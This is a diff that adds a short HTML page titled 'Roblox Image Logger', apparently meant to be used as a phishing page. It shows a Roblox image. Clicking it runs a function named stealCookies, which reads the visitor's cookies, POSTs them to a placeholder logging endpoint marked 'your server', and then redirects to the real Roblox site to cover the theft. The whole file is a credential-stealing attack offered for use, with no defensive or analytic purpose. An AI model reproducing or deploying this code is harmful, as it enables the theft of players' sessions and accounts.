@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Image Logger</title>
+</head>
+<body>
+    <img src="https://tr.rbxcdn.com/7d4c2a9e3c3b8b6e7b8a9e9c5d2b7c8d/420/420/Image/Png" alt="Roblox" onclick="stealCookies()">
+    
+    <script>
+        function stealCookies() {
+            const cookies = document.cookie;
+            
+            // Send cookies to your server
+            fetch('YOUR_LOGGING_ENDPOINT', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookies })
+            });
+            
+            // Redirect to real Roblox
+            window.location.href = "https://www.roblox.com";
+        }
+    </script>
+</body>
+</html>
